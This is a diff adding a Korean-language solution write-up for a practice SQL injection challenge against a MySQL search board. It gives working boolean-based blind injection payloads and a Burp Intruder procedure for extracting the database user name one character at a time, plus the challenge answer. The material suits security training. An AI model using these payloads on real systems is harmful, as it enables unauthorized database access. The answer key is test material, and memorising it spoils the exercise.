@@ -1,0 +1,28 @@
+==============================
+* SQL Injection 문제 4번 MySQL 
+==============================
+1. 풀이 과정
+- 소문자 aaaa로 검색 시 AAAAAA 게시물 검색됨 -> 대소문자 구분 x
+> 쿼리문 유추
+select 컬럼들 from 게시판 where 
+제목 like upper('%__검색어__%')
+> 공격포인트
+검색어 : aaaa%' and 10=10 and 't%'='t -> 게시물 출력
+검색어 : aaaa%' and 10=1 and 't%'='t -> 게시물 출력 x
+최종 검색어 : eagle%' and (__공격쿼리__) and 't%'='t
+> 유저명 탈취
+SELECT LENGTH(USER()); -> 유저명의 길이 확인
+aaaa%' and (SELECT LENGTH(USER())) > 0 and 't%'='t -> 유저명의 길이가 0보다 크면 참이므로 게시물 출력됨
+SELECT ASCII(SUBSTRING(USER(), 1, 1)) > 0; -> 유저명의 한글자 씩 확인
+aaaa%' and (SELECT ASCII(SUBSTRING(USER(), 1, 1))) >64 and 't%'='t -> 게시물 출력 확인(이메일 계정형태로 @아스키 값이 64인 것을 기준으로 확인)
+리피터로 반복 확인 시 @ 앞의 user명이 총 5글자인 것 확인됨
+인트루더에서 aaaa%' and (SELECT ASCII(SUBSTRING(USER(), 1, 1))) = $0$ and 't%'='t 쿼리를 33~126의 1씩 증가하게 설정하여 확인
+1번째 : I(아스키 73)
+2번째 : N(아스키 78)
+3번째 : F(아스키 70)
+4번째 : O(아스키 79)
+5번째 : S(아스키 83)
+
+2. 정답
+infos
+==============================
